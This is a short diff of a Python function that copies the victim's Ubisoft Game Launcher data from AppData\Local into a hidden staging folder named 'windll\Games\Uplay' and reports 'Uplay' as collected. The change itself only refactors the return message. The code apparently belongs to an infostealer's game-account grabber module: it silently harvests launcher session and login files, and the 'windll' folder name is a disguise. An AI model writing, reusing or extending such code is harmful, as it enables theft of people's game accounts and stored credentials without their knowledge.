@@ -16,13 +16,14 @@ from manager.logger import Log
 
 path = r"\Ubisoft Game Launcher"
 
-def Ubisoft(data):
+def Ubisoft():
     try:
+        msgInfo=""
         pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
         user = environ['USERPROFILE'] + sep + r'AppData\Local'
         copytree(user+ sep + path,rf'{pathtofile}\windll\Games\Uplay')
-        data.append("\n∟🎮Uplay")
-        return data
+        msgInfo+="\n∟🎮Uplay"
+        return msgInfo
     except Exception as error:
         Log(f"Ubisoft(Uplay) ---> {error}")
-        return data
+        return msgInfo
